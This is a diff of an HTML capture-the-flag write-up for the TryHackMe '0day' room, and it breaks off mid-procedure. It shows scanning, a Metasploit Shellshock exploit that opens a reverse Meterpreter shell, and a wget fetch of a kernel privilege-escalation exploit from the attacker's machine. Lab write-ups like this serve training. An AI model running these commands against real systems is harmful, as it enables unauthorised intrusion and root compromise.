@@ -5,100 +5,88 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>My Website</title>
     <style>
-        pre {
-            position: relative;
-        }
-        .copy-btn {
-            position: absolute;
-            top: 5px;
-            right: 10px;
-            padding: 5px;
-            background-color: #333;
-            color: #fff;
-            border: none;
-            cursor: pointer;
+        body {
+            background-color: #333333; /* Antrasit rengi (koyu gri) */
+            color: white; /* Metin rengini beyaz olarak ayarlar */
+            font-family: Arial, sans-serif; /* Metin fontunu ayarlar */
         }
     </style>
 </head>
 <body>
-    <pre>
-        <code>
-            Bu şekilde yazılmış bir kod bloğu
-        </code>
-        <button class="copy-btn">Kopyala</button>
-    </pre>
 
- <p><a href="https://tryhackme.com/room/0day">Link to room on TryHackMe.com</a></p>
+<p><a href="https://tryhackme.com/room/0day">Link to room on TryHackMe.com</a></p>
 <p>First step : enumerating ports with rustcan and nmap:</p>
 <pre><code>┌─[✗]─[root@parrot]─[/home/parrot]
-└──╼ #rustscan -a <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>
-.<span class="hljs-comment">----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.</span>
+└──╼ #rustscan -a 10.10.105.222
+.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
 | {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
 | .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
-`-' `-'`<span class="hljs-comment">-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'</span>
+`-&#39; `-&#39;`-----&#39;`----&#39;  `-&#39;  `----&#39;  `---&#39; `-&#39;  `-&#39;`-&#39; `-&#39;
 The Modern Day Port Scanner.
 ________________________________________
-: <span class="hljs-type">http</span>://discord.skerritt.blog         :
-: <span class="hljs-type">https</span>://github.com/RustScan/RustScan :
+: http://discord.skerritt.blog         :
+: https://github.com/RustScan/RustScan :
  --------------------------------------
-RustScan: Making sure <span class="hljs-symbol">'closed</span>' isn<span class="hljs-symbol">'t</span> just a state <span class="hljs-keyword">of</span> mind.
+RustScan: Making sure &#39;closed&#39; isn&#39;t just a state of mind.
 
-[~] The config file <span class="hljs-keyword">is</span> expected to be <span class="hljs-keyword">at</span> <span class="hljs-string">"/root/.rustscan.toml"</span>
-[!] File limit <span class="hljs-keyword">is</span> lower than default batch size. Consider upping <span class="hljs-keyword">with</span> <span class="hljs-comment">--ulimit. May cause harm to sensitive servers</span>
-[!] Your file limit <span class="hljs-keyword">is</span> very small, which negatively impacts RustScan<span class="hljs-symbol">'s</span> speed. <span class="hljs-keyword">Use</span> the Docker image, <span class="hljs-keyword">or</span> up the Ulimit <span class="hljs-keyword">with</span> '<span class="hljs-comment">--ulimit 5000'. </span>
-Open <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>:<span class="hljs-number">22</span>
-Open <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>:<span class="hljs-number">80</span>
+[~] The config file is expected to be at &quot;/root/.rustscan.toml&quot;
+[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+[!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. 
+Open 10.10.105.222:22
+Open 10.10.105.222:80
 [~] Starting Script(s)
-[~] Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">06</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span> +<span class="hljs-number">03</span>
-Initiating Ping Scan <span class="hljs-keyword">at</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>
-Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span> [<span class="hljs-number">4</span> ports]
-Completed Ping Scan <span class="hljs-keyword">at</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>, <span class="hljs-number">0.45</span>s elapsed (<span class="hljs-number">1</span> total hosts)
-Initiating Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. <span class="hljs-keyword">at</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>
-Completed Parallel DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> host. <span class="hljs-keyword">at</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>, <span class="hljs-number">1.03</span>s elapsed
-DNS resolution <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> IPs took <span class="hljs-number">1.03</span>s. Mode: Async [#: <span class="hljs-number">1</span>, OK: <span class="hljs-number">0</span>, NX: <span class="hljs-number">1</span>, DR: <span class="hljs-number">0</span>, SF: <span class="hljs-number">0</span>, TR: <span class="hljs-number">1</span>, CN: <span class="hljs-number">0</span>]
-Initiating SYN Stealth Scan <span class="hljs-keyword">at</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>
-Scanning <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span> [<span class="hljs-number">2</span> ports]
-Discovered open port <span class="hljs-number">22</span>/tcp on <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>
-Discovered open port <span class="hljs-number">80</span>/tcp on <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>
-Completed SYN Stealth Scan <span class="hljs-keyword">at</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>, <span class="hljs-number">0.48</span>s elapsed (<span class="hljs-number">2</span> total ports)
-Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>
-Host <span class="hljs-keyword">is</span> up, received echo-reply ttl <span class="hljs-number">60</span> (<span class="hljs-number">0.42</span>s latency).
-Scanned <span class="hljs-keyword">at</span> <span class="hljs-number">2023</span>-<span class="hljs-number">05</span>-<span class="hljs-number">06</span> <span class="hljs-number">22</span>:<span class="hljs-number">02</span>:<span class="hljs-number">26</span> +<span class="hljs-number">03</span> <span class="hljs-keyword">for</span> <span class="hljs-number">1</span>s
+[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-05-06 22:02 +03
+Initiating Ping Scan at 22:02
+Scanning 10.10.105.222 [4 ports]
+Completed Ping Scan at 22:02, 0.45s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 22:02
+Completed Parallel DNS resolution of 1 host. at 22:02, 1.03s elapsed
+DNS resolution of 1 IPs took 1.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
+Initiating SYN Stealth Scan at 22:02
+Scanning 10.10.105.222 [2 ports]
+Discovered open port 22/tcp on 10.10.105.222
+Discovered open port 80/tcp on 10.10.105.222
+Completed SYN Stealth Scan at 22:02, 0.48s elapsed (2 total ports)
+Nmap scan report for 10.10.105.222
+Host is up, received echo-reply ttl 60 (0.42s latency).
+Scanned at 2023-05-06 22:02:26 +03 for 1s
 
 PORT   STATE SERVICE REASON
-<span class="hljs-number">22</span>/tcp open  ssh     syn-ack ttl <span class="hljs-number">60</span>
-<span class="hljs-number">80</span>/tcp open  http    syn-ack ttl <span class="hljs-number">60</span>
+22/tcp open  ssh     syn-ack ttl 60
+80/tcp open  http    syn-ack ttl 60
 
 Read data files from: /usr/bin/../share/nmap
-Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">2.05</span> seconds
-           Raw packets sent: <span class="hljs-number">6</span> (<span class="hljs-number">240</span>B) | Rcvd: <span class="hljs-number">3</span> (<span class="hljs-number">116</span>B)
-</code></pre><pre><code>┌─<span class="hljs-selector-attr">[✗]</span>─<span class="hljs-selector-attr">[root@parrot]</span>─<span class="hljs-selector-attr">[/home/parrot]</span>
-└──╼ <span class="hljs-selector-id">#nmap</span> <span class="hljs-selector-tag">-p</span> <span class="hljs-selector-tag">22</span>,<span class="hljs-selector-tag">80</span> <span class="hljs-selector-tag">-sC</span> <span class="hljs-selector-tag">-sV</span> <span class="hljs-selector-tag">10</span><span class="hljs-selector-class">.10</span><span class="hljs-selector-class">.105</span><span class="hljs-selector-class">.222</span>       
-<span class="hljs-selector-tag">Starting</span> <span class="hljs-selector-tag">Nmap</span> <span class="hljs-selector-tag">7</span><span class="hljs-selector-class">.80</span> ( <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org ) at 2023-10-22 07:47 CEST</span>
-Nmap scan report for <span class="hljs-number">10.10</span>.<span class="hljs-number">105.222</span>
-Host is up (<span class="hljs-number">0.047s</span> latency).
-Not <span class="hljs-attribute">shown</span>: <span class="hljs-number">65533</span> closed ports
+Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
+           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)
+</code></pre>
+<pre><code>┌─[✗]─[root@parrot]─[/home/parrot]
+└──╼ #nmap -p 22,80 -sC -sV 10.10.105.222       
+Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-22 07:47 CEST
+Nmap scan report for 10.10.105.222
+Host is up (0.047s latency).
+Not shown: 65533 closed ports
 PORT   STATE SERVICE VERSION
-<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">6.6</span>.<span class="hljs-number">1</span>p1 Ubuntu <span class="hljs-number">2</span>ubuntu2.<span class="hljs-number">13</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
-| <span class="hljs-attribute">ssh-hostkey</span>: 
-|   <span class="hljs-number">1024</span> <span class="hljs-number">57</span>:<span class="hljs-number">20</span>:<span class="hljs-number">82</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-number">62</span>:<span class="hljs-attribute">aa</span>:<span class="hljs-number">8</span><span class="hljs-attribute">f</span>:<span class="hljs-number">42</span>:<span class="hljs-number">23</span>:<span class="hljs-attribute">c0</span>:<span class="hljs-attribute">b8</span>:<span class="hljs-number">93</span>:<span class="hljs-number">99</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">49</span>:<span class="hljs-number">9</span>c (DSA)
-|   <span class="hljs-number">2048</span> <span class="hljs-number">4</span><span class="hljs-attribute">c</span>:<span class="hljs-number">40</span>:<span class="hljs-attribute">db</span>:<span class="hljs-number">32</span>:<span class="hljs-number">64</span>:<span class="hljs-number">0</span><span class="hljs-attribute">d</span>:<span class="hljs-number">11</span>:<span class="hljs-number">0</span><span class="hljs-attribute">c</span>:<span class="hljs-attribute">ef</span>:<span class="hljs-number">4</span><span class="hljs-attribute">f</span>:<span class="hljs-attribute">b8</span>:<span class="hljs-number">5</span><span class="hljs-attribute">b</span>:<span class="hljs-number">73</span>:<span class="hljs-number">9</span><span class="hljs-attribute">b</span>:<span class="hljs-attribute">c7</span>:<span class="hljs-number">6</span>b (RSA)
-|   <span class="hljs-number">256</span> <span class="hljs-attribute">f7</span>:<span class="hljs-number">6</span><span class="hljs-attribute">f</span>:<span class="hljs-number">78</span>:<span class="hljs-attribute">d5</span>:<span class="hljs-number">83</span>:<span class="hljs-number">52</span>:<span class="hljs-attribute">a6</span>:<span class="hljs-number">4</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">da</span>:<span class="hljs-number">21</span>:<span class="hljs-number">3</span><span class="hljs-attribute">c</span>:<span class="hljs-number">55</span>:<span class="hljs-number">47</span>:<span class="hljs-attribute">b7</span>:<span class="hljs-number">2</span><span class="hljs-attribute">d</span>:<span class="hljs-number">6</span>d (ECDSA)
-|_  <span class="hljs-number">256</span> <span class="hljs-attribute">a5</span>:<span class="hljs-attribute">b4</span>:<span class="hljs-attribute">f0</span>:<span class="hljs-number">84</span>:<span class="hljs-attribute">b6</span>:<span class="hljs-attribute">a7</span>:<span class="hljs-number">8</span><span class="hljs-attribute">d</span>:<span class="hljs-attribute">eb</span>:<span class="hljs-number">0</span><span class="hljs-attribute">a</span>:<span class="hljs-number">9</span><span class="hljs-attribute">d</span>:<span class="hljs-number">3</span><span class="hljs-attribute">e</span>:<span class="hljs-number">74</span>:<span class="hljs-number">37</span>:<span class="hljs-number">33</span>:<span class="hljs-number">65</span>:<span class="hljs-number">16</span> (ED25519)
-<span class="hljs-number">80</span>/tcp open  http    Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">7</span> ((Ubuntu))
-|<span class="hljs-attribute">_http-server-header</span>: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">7</span> (Ubuntu)
-|<span class="hljs-attribute">_http-title</span>: <span class="hljs-number">0</span>day
-Service <span class="hljs-attribute">Info</span>: <span class="hljs-attribute">OS</span>: Linux; <span class="hljs-attribute">CPE</span>: <span class="hljs-attribute">cpe</span>:/<span class="hljs-attribute">o</span>:<span class="hljs-attribute">linux</span>:linux_kernel
+22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
+|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
+|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
+|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+|_http-title: 0day
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
-Service detection performed. Please report any incorrect results at <span class="hljs-attribute">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span>
-Nmap <span class="hljs-attribute">done</span>: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned in <span class="hljs-number">29.16</span> seconds
-</code></pre><p>After this results we see there is only two ports are open. If we search exploit for this versions of services we cant find something useful. So we continue to enumaration for port 80 with gobuster:</p>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 29.16 seconds
+</code></pre>
+<p>After this results we see there is only two ports are open. If we search exploit for this versions of services we cant find something useful. So we continue to enumaration for port 80 with gobuster:</p>
 <pre><code>┌─[root@parrot]─[/home/parrot]
-<span class="hljs-section">└──╼ #gobuster dir -u http://10.10.105.222/ -w common.txt
-===============================================================</span>
+└──╼ #gobuster dir -u http://10.10.105.222/ -w common.txt
+===============================================================
 Gobuster v3.6
-<span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
-===============================================================</span>
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
+===============================================================
 [+] Url:                     http://10.10.105.222/
 [+] Method:                  GET
 [+] Threads:                 10
@@ -124,42 +112,44 @@ Starting gobuster in directory enumeration mode
 /secret               (Status: 301) [Size: 314] [--&gt; http://10.10.105.222/secret/]
 /server-status        (Status: 403) [Size: 293]
 /uploads              (Status: 301) [Size: 315] [--&gt; http://10.10.105.222/uploads/]
-<span class="hljs-section">Progress: 4614 / 4615 (99.98%)
-===============================================================</span>
-<span class="hljs-section">Finished
-===============================================================</span>
-</code></pre><p>We see there is robots.txt but when we go to the /robots.txt and there is a funny message:</p>
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+</code></pre>
+<p>We see there is robots.txt but when we go to the /robots.txt and there is a funny message:</p>
 <p><img src="pics/0day2.png" alt=""></p>
 <p>after that we try to look at the /secret directory but there is only one cute turtle:</p>
 <p><img src="pics/0day3.png" alt=""></p>
 <p>So after that we start nikto for to find out which vulnerability this site has:</p>
 <pre><code>┌─[root@parrot]─[/home/parrot]
-└──╼ <span class="hljs-comment">#nikto -h 10.10.105.222</span>
-- Nikto v2<span class="hljs-number">.5</span><span class="hljs-number">.0</span>
-<span class="hljs-comment">---------------------------------------------------------------------------</span>
-+ Target IP:          <span class="hljs-number">10.10</span><span class="hljs-number">.105</span><span class="hljs-number">.222</span>
-+ Target Hostname:    <span class="hljs-number">10.10</span><span class="hljs-number">.105</span><span class="hljs-number">.222</span>
-+ Target Port:        <span class="hljs-number">80</span>
-+ Start Time:         <span class="hljs-number">2023</span><span class="hljs-number">-05</span><span class="hljs-number">-06</span> <span class="hljs-number">22</span>:<span class="hljs-number">39</span>:<span class="hljs-number">57</span> (GMT3)
-<span class="hljs-comment">---------------------------------------------------------------------------</span>
-+ Server: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.7</span> (Ubuntu)
-+ /: The anti-clickjacking X-Frame-Options header is <span class="hljs-keyword">not</span> present. See: <span class="hljs-keyword">https</span>://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
-+ /: The X-Content-Type-Options header is <span class="hljs-keyword">not</span> <span class="hljs-built_in">set</span>. This could allow <span class="hljs-keyword">the</span> user agent <span class="hljs-built_in">to</span> render <span class="hljs-keyword">the</span> content <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> site <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> different fashion <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> MIME type. See: <span class="hljs-keyword">https</span>://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
-+ /: Server may leak inodes via ETags, header found <span class="hljs-keyword">with</span> <span class="hljs-built_in">file</span> /, inode: bd1, size: <span class="hljs-number">5</span>ae57bb9a1192, mtime: gzip. See: <span class="hljs-keyword">http</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="hljs-number">-2003</span><span class="hljs-number">-1418</span>
-+ Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.7</span> appears <span class="hljs-built_in">to</span> be outdated (current is <span class="hljs-keyword">at</span> least Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.54</span>). Apache <span class="hljs-number">2.2</span><span class="hljs-number">.34</span> is <span class="hljs-keyword">the</span> EOL <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> <span class="hljs-number">2.</span>x branch.
+└──╼ #nikto -h 10.10.105.222
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          10.10.105.222
++ Target Hostname:    10.10.105.222
++ Target Port:        80
++ Start Time:         2023-05-06 22:39:57 (GMT3)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
++ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
 + OPTIONS: Allowed HTTP Methods: OPTIONS, GET, HEAD, POST .
-+ /cgi-bin/test.cgi: Uncommon header <span class="hljs-string">'93e4r0-cve-2014-6278'</span> found, <span class="hljs-keyword">with</span> contents: <span class="hljs-literal">true</span>.
-+ /cgi-bin/test.cgi: Site appears vulnerable <span class="hljs-built_in">to</span> <span class="hljs-keyword">the</span> <span class="hljs-string">'shellshock'</span> vulnerability. See: <span class="hljs-keyword">http</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="hljs-number">-2014</span><span class="hljs-number">-6271</span>
-</code></pre><p>So nikto says there is shellshock vulnerability for this site and ı know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and we set the options like this:</p>
-<pre><code>[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/http/apache<span class="hljs-emphasis">_mod_</span>cgi<span class="hljs-emphasis">_bash_</span>env_exec) &gt;&gt; set  RHOSTS 10.10.105.222
++ /cgi-bin/test.cgi: Uncommon header &#39;93e4r0-cve-2014-6278&#39; found, with contents: true.
++ /cgi-bin/test.cgi: Site appears vulnerable to the &#39;shellshock&#39; vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6271
+</code></pre>
+<p>So nikto says there is shellshock vulnerability for this site and ı know a perfect exploit for it. For this vulnerabilty we use exploit/multi/http/apache_mod_cgi_bash_env_exec  exploit in the metasploit and we set the options like this:</p>
+<pre><code>[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; set  RHOSTS 10.10.105.222
 RHOSTS =&gt; 10.10.105.222
-[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/http/apache<span class="hljs-emphasis">_mod_</span>cgi<span class="hljs-emphasis">_bash_</span>env_exec) &gt;&gt; set LHOST 10.17.51.16
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; set LHOST 10.17.51.16
 LHOST =&gt; 10.17.51.16
-[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/http/apache<span class="hljs-emphasis">_mod_</span>cgi<span class="hljs-emphasis">_bash_</span>env_exec) &gt;&gt; set TARGETURI /cgi-bin/test.cgi
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; set TARGETURI /cgi-bin/test.cgi
 TARGETURI =&gt; /cgi-bin/test.cgi
-[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/http/apache<span class="hljs-emphasis">_mod_</span>cgi<span class="hljs-emphasis">_bash_</span>env_exec) &gt;&gt; set LPORT 1234
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; set LPORT 1234
 LPORT =&gt; 1234
-[<span class="hljs-string">msf</span>](<span class="hljs-link">Jobs:0 Agents:0</span>) exploit(multi/http/apache<span class="hljs-emphasis">_mod_</span>cgi<span class="hljs-emphasis">_bash_</span>env_exec) &gt;&gt; run
+[msf](Jobs:0 Agents:0) exploit(multi/http/apache_mod_cgi_bash_env_exec) &gt;&gt; run
 
 [*] Started reverse TCP handler on 10.17.51.16:1234 
 [*] Command Stager progress - 100.00% done (1092/1092 bytes)
@@ -167,24 +157,26 @@ LPORT =&gt; 1234
 [*] Meterpreter session 1 opened (10.17.51.16:1234 -&gt; 10.10.105.222:41085) at 2023-05-06 22:48:19 +0300
 
 (Meterpreter 1)(/usr/lib/cgi-bin) &gt;
-</code></pre><p>And we have a meterpreter shell. For to get a normal shell we use shell command and look for if python exists and we see there is python3 and then we use this command to get a normal shell:</p>
-<pre><code>(Meterpreter <span class="hljs-number">1</span>)(/usr/lib/cgi-bin) &gt; <span class="hljs-keyword">shell</span>
-Process <span class="hljs-number">1087</span> created.
-Channel <span class="hljs-number">1</span> created.
-<span class="hljs-keyword">python3</span> --<span class="hljs-keyword">version</span>
-Python <span class="hljs-number">3.4</span>.<span class="hljs-number">0</span>
-<span class="hljs-keyword">python3</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
-www-data@ubuntu:/usr/lib/cgi-bin$
-</code></pre><p>So we see we are in as www-data. When we go the home directory we see there is only one user named ryan and there is a .secret file but we dont have permission to read it. When go to ryan directory we get our first flag:</p>
+</code></pre>
+<p>And we have a meterpreter shell. For to get a normal shell we use shell command and look for if python exists and we see there is python3 and then we use this command to get a normal shell:</p>
+<pre><code>(Meterpreter 1)(/usr/lib/cgi-bin) &gt; shell
+Process 1087 created.
+Channel 1 created.
+python3 --version
+Python 3.4.0
+python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
+www-data@ubuntu:/usr/lib/cgi-bin$ 
+</code></pre>
+<p>So we see we are in as www-data. When we go the home directory we see there is only one user named ryan and there is a .secret file but we dont have permission to read it. When go to ryan directory we get our first flag:</p>
 <pre><code>www-data@ubuntu:/usr/lib/cgi-bin$ cd /home
 cd /home
 www-data@ubuntu:/home$ ls -la
 ls -la
 total 12
-drwxr-xr-x <span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.
-drwxr-xr-x<span class="hljs-number"> 22 </span>root root<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>..
-lrwxrwxrwx <span class="hljs-number"> 1 </span>root root  <span class="hljs-number"> 14 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.secret -&gt; /root/root.txt
-drwxr-xr-x <span class="hljs-number"> 3 </span>ryan ryan<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>ryan
+drwxr-xr-x  3 root root 4096 Sep  2  2020 .
+drwxr-xr-x 22 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -&gt; /root/root.txt
+drwxr-xr-x  3 ryan ryan 4096 Sep  2  2020 ryan
 www-data@ubuntu:/home$ cat .secret
 cat .secret
 cat: .secret: Permission denied
@@ -193,70 +185,63 @@ cd ryan
 www-data@ubuntu:/home/ryan$ ls -la
 ls -la
 total 28
-drwxr-xr-x<span class="hljs-number"> 3 </span>ryan ryan<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.
-drwxr-xr-x<span class="hljs-number"> 3 </span>root root<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>..
-lrwxrwxrwx<span class="hljs-number"> 1 </span>ryan ryan   <span class="hljs-number"> 9 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.bash_history -&gt; /dev/null
--rw-r--r--<span class="hljs-number"> 1 </span>ryan ryan <span class="hljs-number"> 220 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.bash_logout
--rw-r--r--<span class="hljs-number"> 1 </span>ryan ryan<span class="hljs-number"> 3637 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.bashrc
-drwx------<span class="hljs-number"> 2 </span>ryan ryan<span class="hljs-number"> 4096 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.cache
--rw-r--r--<span class="hljs-number"> 1 </span>ryan ryan <span class="hljs-number"> 675 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>.profile
--rw-rw-r--<span class="hljs-number"> 1 </span>ryan ryan  <span class="hljs-number"> 22 </span>Sep <span class="hljs-number"> 2 </span><span class="hljs-number"> 2020 </span>user.txt
+drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
+drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
+lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
+-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
+drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
+-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
+-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
 www-data@ubuntu:/home/ryan$ cat user.txt
 cat user.txt
 THM{Sh3llSh0ck_r0ckz}
-</code></pre><p>After that we use this command to see can we see our permissions but system asks us the password:</p>
-<pre><code>www-data<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/ryan</span><span class="hljs-variable">$ </span>sudo -l
+</code></pre>
+<p>After that we use this command to see can we see our permissions but system asks us the password:</p>
+<pre><code>www-data@ubuntu:/home/ryan$ sudo -l
 sudo -l
-[sudo] password <span class="hljs-keyword">for</span> www-<span class="hljs-symbol">data:</span>
-</code></pre><p>When we use this command to see what version of linux we have wee se it is a very old one:</p>
-<pre><code>www-data<span class="hljs-variable">@ubuntu</span><span class="hljs-symbol">:/home/ryan</span><span class="hljs-variable">$ </span>uname -a
+[sudo] password for www-data: 
+</code></pre>
+<p>When we use this command to see what version of linux we have wee se it is a very old one:</p>
+<pre><code>www-data@ubuntu:/home/ryan$ uname -a
 uname -a
-Linux ubuntu <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">32</span>-generic <span class="hljs-comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span>
-</code></pre><p>When we search exploit for this version we found a useful exploit:</p>
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre>
+<p>When we search exploit for this version we found a useful exploit:</p>
 <p><a href="https://www.exploit-db.com/exploits/37292">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#39;overlayfs&#39; Local Privilege Escalation</a></p>
 <p><img src="pics/0day4.png" alt=""></p>
 <p>So all we should do send this exploit to the target and run it. For sending we can use python with this command in our attacker box:</p>
-<pre><code>python3 -m http<span class="hljs-selector-class">.server</span> <span class="hljs-number">7000</span>
-</code></pre><p>Then we go to the /dev/shm directory in the target because it is writable for everyone and we use this command to get our exploit:</p>
-<pre><code>wget http://<span class="hljs-number">10.17.51.16</span>:<span class="hljs-number">7000/37292</span>.c
-</code></pre><p>Then we compile it and run it with this commands:</p>
